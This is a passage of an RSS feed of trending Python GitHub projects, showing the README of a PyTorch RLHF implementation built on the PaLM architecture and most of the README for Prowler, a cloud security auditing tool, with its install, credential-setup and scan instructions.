<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Python Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-12-25T01:35:30Z</updated>
  <subtitle>Daily Trending of Python in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>lucidrains/PaLM-rlhf-pytorch</title>
    <updated>2022-12-25T01:35:30Z</updated>
    <id>tag:github.com,2022-12-25:/lucidrains/PaLM-rlhf-pytorch</id>
    <link href="https://github.com/lucidrains/PaLM-rlhf-pytorch" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Implementation of RLHF (Reinforcement Learning with Human Feedback) on top of the PaLM architecture. Basically ChatGPT but with PaLM&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;PaLM + RLHF - Pytorch (wip)&lt;/h2&gt; &#xA;&lt;p&gt;Implementation of RLHF (Reinforcement Learning with Human Feedback) on top of the PaLM architecture. Maybe I&#39;ll add retrieval functionality too, à la &lt;a href=&#34;https://github.com/lucidrains/RETRO-pytorch&#34;&gt;RETRO&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Install&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ pip install palm-rlhf-pytorch&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;p&gt;First train &lt;code&gt;PaLM&lt;/code&gt;, like any other autoregressive transformer&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import torch&#xA;from palm_rlhf_pytorch import PaLM&#xA;&#xA;palm = PaLM(&#xA;    num_tokens = 20000,&#xA;    dim = 512,&#xA;    depth = 12&#xA;).cuda()&#xA;&#xA;seq = torch.randint(0, 20000, (1, 2048)).cuda()&#xA;&#xA;loss = palm(seq, return_loss = True)&#xA;loss.backward()&#xA;&#xA;# after much training, you can now generate sequences&#xA;&#xA;generated = palm.generate(2048) # (1, 2048)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Then train your reward model, with the curated human feedback. In the original paper, they could not get reward model to be finetuned from a pretrained transformer without overfitting, but I gave the option to finetune with &lt;code&gt;LoRA&lt;/code&gt; anyways, since it is still open research.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import torch&#xA;from palm_rlhf_pytorch import PaLM, RewardModel&#xA;&#xA;palm = PaLM(&#xA;    num_tokens = 20000,&#xA;    dim = 512,&#xA;    depth = 12,&#xA;    causal = False&#xA;)&#xA;&#xA;reward_model = RewardModel(&#xA;    palm,&#xA;    num_binned_output = 5 # say rating from 1 to 5&#xA;).cuda()&#xA;&#xA;# mock data&#xA;&#xA;seq = torch.randint(0, 20000, (1, 1024)).cuda()&#xA;prompt_mask = torch.zeros(1, 1024).bool().cuda() # which part of the sequence is prompt, which part is response&#xA;labels = torch.randint(0, 5, (1,)).cuda()&#xA;&#xA;# train&#xA;&#xA;loss = reward_model(seq, prompt_mask = prompt_mask, labels = labels)&#xA;loss.backward()&#xA;&#xA;# after much training&#xA;&#xA;reward = reward_model(seq, prompt_mask = prompt_mask)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Then you will pass your transformer and the rewards model to the &lt;code&gt;RLHFTrainer&lt;/code&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import torch&#xA;from palm_rlhf_pytorch import PaLM, RewardModel, RLHFTrainer&#xA;&#xA;# load your pretrained palm&#xA;&#xA;palm = PaLM(&#xA;    num_tokens=256,&#xA;    dim=512,&#xA;    depth=8&#xA;).cuda()&#xA;&#xA;palm.load(&#39;./path/to/pretrained/palm.pt&#39;)&#xA;&#xA;# load your pretrained reward model&#xA;&#xA;reward_model = RewardModel(&#xA;    palm,&#xA;    num_binned_output = 5&#xA;).cuda()&#xA;&#xA;reward_model.load(&#39;./path/to/pretrained/reward_model.pt&#39;)&#xA;&#xA;# ready your list of prompts for reinforcement learning&#xA;&#xA;prompts = torch.randint(0, 256, (50000, 512)).cuda() # 50k prompts&#xA;&#xA;# pass it all to the trainer and train&#xA;&#xA;trainer = RLHFTrainer(&#xA;    palm = palm,&#xA;    reward_model = reward_model,&#xA;    prompt_token_ids = prompts&#xA;)&#xA;&#xA;trainer.train(num_episodes = 50000)&#xA;&#xA;# then, if it succeeded...&#xA;# generate say 10 samples and use the reward model to return the best one&#xA;&#xA;answer = trainer.generate(2048, prompt = prompts[0], num_samples = 10) # (&amp;lt;= 2048,)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Todo&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;p&gt;clone base transformer with separate lora for critic&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;p&gt;also allow for non-LoRA based finetuning&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;p&gt;redo normalize to be able to have a masked version, not sure if anyone will ever use per token rewards / values, but good practice to implement&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; &lt;p&gt;add huggingface accelerate and test out wandb instrumentation&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; &lt;p&gt;search literature to figure out what is the latest SOTA for PPO, assuming RL field is still making progress.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; &lt;p&gt;test the system using a pretrained sentiment network as reward model&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; &lt;p&gt;write the memory in PPO to memmapped numpy file&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; &lt;p&gt;get sampling with variable lengthed prompts working, even if it is not needed given bottleneck is human feedback&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; &lt;p&gt;allow for finetuning penultimate N layers only in either actor or critic, assuming if pretrained&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Appreciation&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://stability.ai/&#34;&gt;Stability.ai&lt;/a&gt; for the generous sponsorship to work on cutting edge artificial intelligence research&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://huggingface.co/&#34;&gt;🤗 Huggingface&lt;/a&gt; and &lt;a href=&#34;https://carper.ai/&#34;&gt;CarperAI&lt;/a&gt; for penning the blog post &lt;a href=&#34;https://huggingface.co/blog/rlhf&#34;&gt;Illustrating Reinforcement Learning from Human Feedback (RLHF)&lt;/a&gt;, and the former also for their &lt;a href=&#34;https://huggingface.co/docs/accelerate/index&#34;&gt;accelerate&lt;/a&gt; library&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Citations&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bibtex&#34;&gt;@article{Stiennon2020LearningTS,&#xA;    title   = {Learning to summarize from human feedback},&#xA;    author  = {Nisan Stiennon and Long Ouyang and Jeff Wu and Daniel M. Ziegler and Ryan J. Lowe and Chelsea Voss and Alec Radford and Dario Amodei and Paul Christiano},&#xA;    journal = {ArXiv},&#xA;    year    = {2020},&#xA;    volume  = {abs/2009.01325}&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bibtex&#34;&gt;@inproceedings{Chowdhery2022PaLMSL,&#xA;    title   = {PaLM: Scaling Language Modeling with Pathways},&#xA;    author  = {Aakanksha Chowdhery and Sharan Narang and Jacob Devlin and Maarten Bosma and Gaurav Mishra and Adam Roberts and Paul Barham and Hyung Won Chung and Charles Sutton and Sebastian Gehrmann and Parker Schuh and Kensen Shi and Sasha Tsvyashchenko and Joshua Maynez and Abhishek Rao and Parker Barnes and Yi Tay and Noam M. Shazeer and Vinodkumar Prabhakaran and Emily Reif and Nan Du and Benton C. Hutchinson and Reiner Pope and James Bradbury and Jacob Austin and Michael Isard and Guy Gur-Ari and Pengcheng Yin and Toju Duke and Anselm Levskaya and Sanjay Ghemawat and Sunipa Dev and Henryk Michalewski and Xavier Garc{\&#39;i}a and Vedant Misra and Kevin Robinson and Liam Fedus and Denny Zhou and Daphne Ippolito and David Luan and Hyeontaek Lim and Barret Zoph and Alexander Spiridonov and Ryan Sepassi and David Dohan and Shivani Agrawal and Mark Omernick and Andrew M. Dai and Thanumalayan Sankaranarayana Pillai and Marie Pellat and Aitor Lewkowycz and Erica Oliveira Moreira and Rewon Child and Oleksandr Polozov and Katherine Lee and Zongwei Zhou and Xuezhi Wang and Brennan Saeta and Mark Diaz and Orhan Firat and Michele Catasta and Jason Wei and Kathleen S. Meier-Hellstern and Douglas Eck and Jeff Dean and Slav Petrov and Noah Fiedel},&#xA;    year    = {2022}&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bibtex&#34;&gt;@article{Hu2021LoRALA,&#xA;    title   = {LoRA: Low-Rank Adaptation of Large Language Models},&#xA;    author  = {Edward J. Hu and Yelong Shen and Phillip Wallis and Zeyuan Allen-Zhu and Yuanzhi Li and Shean Wang and Weizhu Chen},&#xA;    journal = {ArXiv},&#xA;    year    = {2021},&#xA;    volume  = {abs/2106.09685}&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bibtex&#34;&gt;@inproceedings{Sun2022ALT,&#xA;  title     = {A Length-Extrapolatable Transformer},&#xA;  author    = {Yutao Sun and Li Dong and Barun Patra and Shuming Ma and Shaohan Huang and Alon Benhaim and Vishrav Chaudhary and Xia Song and Furu Wei},&#xA;  year      = {2022}&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
  <entry>
    <title>prowler-cloud/prowler</title>
    <updated>2022-12-25T01:35:30Z</updated>
    <id>tag:github.com,2022-12-25:/prowler-cloud/prowler</id>
    <link href="https://github.com/prowler-cloud/prowler" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Prowler is an Open Source Security tool to perform Cloud Security best practices assessments, audits, incident response, continuous monitoring, hardening and forensics readiness. It contains hundreds of controls covering CIS, PCI-DSS, ISO27001, GDPR, HIPAA, FFIEC, SOC2, AWS FTR, ENS and custom security frameworks.&lt;/p&gt;&lt;hr&gt;&lt;p align=&#34;center&#34;&gt; &lt;img align=&#34;center&#34; src=&#34;https://github.com/prowler-cloud/prowler/raw/62c1ce73bbcdd6b9e5ba03dfcae26dfd165defd9/docs/img/prowler-pro-dark.png?raw=True#gh-dark-mode-only&#34; width=&#34;150&#34; height=&#34;36&#34;&gt; &lt;img align=&#34;center&#34; src=&#34;https://github.com/prowler-cloud/prowler/raw/62c1ce73bbcdd6b9e5ba03dfcae26dfd165defd9/docs/img/prowler-pro-light.png?raw=True#gh-light-mode-only&#34; width=&#34;15%&#34; height=&#34;15%&#34;&gt; &lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;b&gt;&lt;i&gt;See all the things you and your team can do with ProwlerPro at &lt;a href=&#34;https://prowler.pro&#34;&gt;prowler.pro&lt;/a&gt;&lt;/i&gt;&lt;/b&gt; &lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://user-images.githubusercontent.com/3985464/113734260-7ba06900-96fb-11eb-82bc-d4f68a1e2710.png&#34;&gt; &lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;a href=&#34;https://join.slack.com/t/prowler-workspace/shared_invite/zt-1hix76xsl-2uq222JIXrC7Q8It~9ZNog&#34;&gt;&lt;img alt=&#34;Slack Shield&#34; src=&#34;https://img.shields.io/badge/slack-prowler-brightgreen.svg?logo=slack&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://pypi.org/project/prowler-cloud/&#34;&gt;&lt;img alt=&#34;Python Version&#34; src=&#34;https://img.shields.io/pypi/v/prowler-cloud.svg?sanitize=true&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://pypi.python.org/pypi/prowler-cloud/&#34;&gt;&lt;img alt=&#34;Python Version&#34; src=&#34;https://img.shields.io/pypi/pyversions/prowler-cloud.svg?sanitize=true&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://hub.docker.com/r/toniblyx/prowler&#34;&gt;&lt;img alt=&#34;Docker Pulls&#34; src=&#34;https://img.shields.io/docker/pulls/toniblyx/prowler&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://hub.docker.com/r/toniblyx/prowler&#34;&gt;&lt;img alt=&#34;Docker&#34; src=&#34;https://img.shields.io/docker/cloud/build/toniblyx/prowler&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://hub.docker.com/r/toniblyx/prowler&#34;&gt;&lt;img alt=&#34;Docker&#34; src=&#34;https://img.shields.io/docker/image-size/toniblyx/prowler&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://gallery.ecr.aws/o4g1s5r6/prowler&#34;&gt;&lt;img width=&#34;120&#34; height=&#34;19&amp;quot;&#34; alt=&#34;AWS ECR Gallery&#34; src=&#34;https://user-images.githubusercontent.com/3985464/151531396-b6535a68-c907-44eb-95a1-a09508178616.png&#34;&gt;&lt;/a&gt; &lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;a href=&#34;https://github.com/prowler-cloud/prowler&#34;&gt;&lt;img alt=&#34;Repo size&#34; src=&#34;https://img.shields.io/github/repo-size/prowler-cloud/prowler&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/prowler-cloud/prowler/issues&#34;&gt;&lt;img alt=&#34;Issues&#34; src=&#34;https://img.shields.io/github/issues/prowler-cloud/prowler&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/prowler-cloud/prowler/releases&#34;&gt;&lt;img alt=&#34;Version&#34; src=&#34;https://img.shields.io/github/v/release/prowler-cloud/prowler?include_prereleases&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/prowler-cloud/prowler/releases&#34;&gt;&lt;img alt=&#34;Version&#34; src=&#34;https://img.shields.io/github/release-date/prowler-cloud/prowler&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/prowler-cloud/prowler&#34;&gt;&lt;img alt=&#34;Contributors&#34; src=&#34;https://img.shields.io/github/contributors-anon/prowler-cloud/prowler&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/prowler-cloud/prowler&#34;&gt;&lt;img alt=&#34;License&#34; src=&#34;https://img.shields.io/github/license/prowler-cloud/prowler&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://twitter.com/ToniBlyx&#34;&gt;&lt;img alt=&#34;Twitter&#34; src=&#34;https://img.shields.io/twitter/follow/toniblyx?style=social&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://twitter.com/prowlercloud&#34;&gt;&lt;img alt=&#34;Twitter&#34; src=&#34;https://img.shields.io/twitter/follow/prowlercloud?style=social&#34;&gt;&lt;/a&gt; &lt;/p&gt; &#xA;&lt;h1&gt;Description&lt;/h1&gt; &#xA;&lt;p&gt;&lt;code&gt;Prowler&lt;/code&gt; is an Open Source security tool to perform AWS and Azure security best practices assessments, audits, incident response, continuous monitoring, hardening and forensics readiness.&lt;/p&gt; &#xA;&lt;p&gt;It contains hundreds of controls covering CIS, PCI-DSS, ISO27001, GDPR, HIPAA, FFIEC, SOC2, AWS FTR, ENS and custom security frameworks.&lt;/p&gt; &#xA;&lt;h2&gt;Looking for Prowler v2 documentation?&lt;/h2&gt; &#xA;&lt;p&gt;For Prowler v2 Documentation, please go to &lt;a href=&#34;https://github.com/prowler-cloud/prowler/tree/2.12.1&#34;&gt;https://github.com/prowler-cloud/prowler/tree/2.12.1&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h1&gt;⚙️ Install&lt;/h1&gt; &#xA;&lt;h2&gt;Pip package&lt;/h2&gt; &#xA;&lt;p&gt;Prowler is available as a project in &lt;a href=&#34;https://pypi.org/project/prowler-cloud/&#34;&gt;PyPI&lt;/a&gt;, thus can be installed using pip with Python &amp;gt;= 3.9:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;pip install prowler-cloud&#xA;prowler -v&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Containers&lt;/h2&gt; &#xA;&lt;p&gt;The available versions of Prowler are the following:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;latest&lt;/code&gt;: in sync with master branch (bear in mind that it is not a stable version)&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;&amp;lt;x.y.z&amp;gt;&lt;/code&gt; (release): you can find the releases &lt;a href=&#34;https://github.com/prowler-cloud/prowler/releases&#34;&gt;here&lt;/a&gt;, those are stable releases.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;stable&lt;/code&gt;: this tag always point to the latest release.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;The container images are available here:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://hub.docker.com/r/toniblyx/prowler/tags&#34;&gt;DockerHub&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://gallery.ecr.aws/o4g1s5r6/prowler&#34;&gt;AWS Public ECR&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;From Github&lt;/h2&gt; &#xA;&lt;p&gt;Python &amp;gt;= 3.9 is required with pip and pipenv:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;git clone https://github.com/prowler-cloud/prowler&#xA;cd prowler&#xA;pipenv shell&#xA;pipenv install&#xA;python prowler.py -v&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h1&gt;📖 Documentation&lt;/h1&gt; &#xA;&lt;p&gt;The full documentation now can be found at &lt;a href=&#34;https://docs.prowler.cloud&#34;&gt;https://docs.prowler.cloud&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;📐✏️ High level architecture&lt;/h1&gt; &#xA;&lt;p&gt;You can run Prowler from your workstation, an EC2 instance, Fargate or any other container, Codebuild, CloudShell and Cloud9.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/prowler-cloud/prowler/raw/62c1ce73bbcdd6b9e5ba03dfcae26dfd165defd9/docs/img/architecture.png?raw=True&#34; alt=&#34;Architecture&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;📝 Requirements&lt;/h1&gt; &#xA;&lt;p&gt;Prowler has been written in Python using the &lt;a href=&#34;https://boto3.amazonaws.com/v1/documentation/api/latest/index.html#&#34;&gt;AWS SDK (Boto3)&lt;/a&gt; and &lt;a href=&#34;https://azure.github.io/azure-sdk-for-python/&#34;&gt;Azure SDK&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;AWS&lt;/h2&gt; &#xA;&lt;p&gt;Since Prowler uses AWS Credentials under the hood, you can follow any authentication method as described &lt;a href=&#34;https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-quickstart.html#cli-configure-quickstart-precedence&#34;&gt;here&lt;/a&gt;. Make sure you have properly configured your AWS-CLI with a valid Access Key and Region or declare AWS variables properly (or instance profile/role):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;aws configure&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;or&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;export AWS_ACCESS_KEY_ID=&#34;ASXXXXXXX&#34;&#xA;export AWS_SECRET_ACCESS_KEY=&#34;XXXXXXXXX&#34;&#xA;export AWS_SESSION_TOKEN=&#34;XXXXXXXXX&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Those credentials must be associated to a user or role with proper permissions to do all checks. To make sure, add the following AWS managed policies to the user or role being used:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;arn:aws:iam::aws:policy/SecurityAudit&lt;/li&gt; &#xA; &lt;li&gt;arn:aws:iam::aws:policy/job-function/ViewOnlyAccess&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Moreover, some read-only additional permissions are needed for several checks, make sure you attach also the custom policy &lt;a href=&#34;https://github.com/prowler-cloud/prowler/raw/master/permissions/prowler-additions-policy.json&#34;&gt;prowler-additions-policy.json&lt;/a&gt; to the role you are using.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;If you want Prowler to send findings to &lt;a href=&#34;https://aws.amazon.com/security-hub&#34;&gt;AWS Security Hub&lt;/a&gt;, make sure you also attach the custom policy &lt;a href=&#34;https://github.com/prowler-cloud/prowler/raw/master/permissions/prowler-security-hub.json&#34;&gt;prowler-security-hub.json&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;Azure&lt;/h2&gt; &#xA;&lt;p&gt;Prowler for Azure supports the following authentication types:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Service principal authentication by environment variables (Enterprise Application)&lt;/li&gt; &#xA; &lt;li&gt;Current az cli credentials stored&lt;/li&gt; &#xA; &lt;li&gt;Interactive browser authentication&lt;/li&gt; &#xA; &lt;li&gt;Managed identity authentication&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Service Principal authentication&lt;/h3&gt; &#xA;&lt;p&gt;To allow Prowler assume the service principal identity to start the scan it is needed to configure the following environment variables:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;export AZURE_CLIENT_ID=&#34;XXXXXXXXX&#34;&#xA;export AZURE_TENANT_ID=&#34;XXXXXXXXX&#34;&#xA;export AZURE_CLIENT_SECRET=&#34;XXXXXXX&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you try to execute Prowler with the &lt;code&gt;--sp-env-auth&lt;/code&gt; flag and those variables are empty or not exported, the execution is going to fail.&lt;/p&gt; &#xA;&lt;h3&gt;AZ CLI / Browser / Managed Identity authentication&lt;/h3&gt; &#xA;&lt;p&gt;The other three cases does not need additional configuration, &lt;code&gt;--az-cli-auth&lt;/code&gt; and &lt;code&gt;--managed-identity-auth&lt;/code&gt; are automated options, &lt;code&gt;--browser-auth&lt;/code&gt; needs the user to authenticate using the default browser to start the scan.&lt;/p&gt; &#xA;&lt;h3&gt;Permissions&lt;/h3&gt; &#xA;&lt;p&gt;To use each one you need to pass the proper flag to the execution. Prowler fro Azure handles two types of permission scopes, which are:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Azure Active Directory permissions&lt;/strong&gt;: Used to retrieve metadata from the identity assumed by Prowler and future AAD checks (not mandatory to have access to execute the tool)&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Subscription scope permissions&lt;/strong&gt;: Required to launch the checks against your resources, mandatory to launch the tool.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Azure Active Directory scope&lt;/h4&gt; &#xA;&lt;p&gt;Azure Active Directory (AAD) permissions required by the tool are the following:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;Directory.Read.All&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;Policy.Read.All&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Subscriptions scope&lt;/h4&gt; &#xA;&lt;p&gt;Regarding the subscription scope, Prowler by default scans all the subscriptions that is able to list, so it is required to add the following RBAC builtin roles per subscription to the entity that is going to be assumed by the tool:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;Security Reader&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;Reader&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;💻 Basic Usage&lt;/h1&gt; &#xA;&lt;p&gt;To run prowler, you will need to specify the provider (e.g aws or azure):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;prowler &amp;lt;provider&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/prowler-cloud/prowler/raw/b91b0103ff38e66a915c8a0ed84905a07e4aae1d/docs/img/short-display.png?raw=True&#34; alt=&#34;Prowler Execution&#34;&gt;&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Running the &lt;code&gt;prowler&lt;/code&gt; command without options will use your environment variable credentials.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;By default, prowler will generate a CSV, a JSON and a HTML report, however you can generate JSON-ASFF (only for AWS Security Hub) report with &lt;code&gt;-M&lt;/code&gt; or &lt;code&gt;--output-modes&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;prowler &amp;lt;provider&amp;gt; -M csv json json-asff html&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The html report will be located in the &lt;code&gt;output&lt;/code&gt; directory as the other files and it will look like:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/prowler-cloud/prowler/raw/62c1ce73bbcdd6b9e5ba03dfcae26dfd165defd9/docs/img/html-output.png?raw=True&#34; alt=&#34;Prowler Execution&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;You can use &lt;code&gt;-l&lt;/code&gt;/&lt;code&gt;--list-checks&lt;/code&gt; or &lt;code&gt;--list-services&lt;/code&gt; to list all available checks or services within the provider.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;prowler &amp;lt;provider&amp;gt; --list-checks&#xA;prowler &amp;lt;provider&amp;gt; --list-services&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For executing specific checks or services you can use options &lt;code&gt;-c&lt;/code&gt;/&lt;code&gt;--checks&lt;/code&gt; or &lt;code&gt;-s&lt;/code&gt;/&lt;code&gt;--services&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;prowler aws --checks s3_bucket_public_access&#xA;prowler aws --services s3 ec2&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Also, checks and services can be excluded with options &lt;code&gt;-e&lt;/code&gt;/&lt;code&gt;--excluded-checks&lt;/code&gt; or &lt;code&gt;--excluded-services&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;prowler aws --excluded-checks s3_bucket_public_access&#xA;prowler aws --excluded-services s3 ec2&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can always use &lt;code&gt;-h&lt;/code&gt;/&lt;code&gt;--help&lt;/code&gt; to access to the usage information and all the possible options:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;prowler -h&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Checks Configurations&lt;/h2&gt; &#xA;&lt;p&gt;Several Prowler&#39;s checks have user configurable variables that can be modified in a common &lt;strong&gt;configuration file&lt;/strong&gt;. This file can be found in the following path:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;prowler/config/config.yaml&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;AWS&lt;/h2&gt; &#xA;&lt;p&gt;Use a custom AWS profile with &lt;code&gt;-p&lt;/code&gt;/&lt;code&gt;--profile&lt;/code&gt; and/or AWS regions which you want to audit with &lt;code&gt;-f&lt;/code&gt;/&lt;code&gt;--filter-region&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;prowler aws --profile custom-profile -f us-east-1 eu-south-2&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;By default, &lt;code&gt;prowler&lt;/code&gt; will scan all AWS regions.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;Azure&lt;/h2&gt; &#xA;&lt;p&gt;With Azure you need to specify which auth method is going to be used:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;prowler azure [--sp-env-auth, --az-cli-auth, --browser-auth, --managed-identity-auth]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;By default, &lt;code&gt;prowler&lt;/code&gt; will scan all Azure subscriptions.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h1&gt;🎉 New Features&lt;/h1&gt; 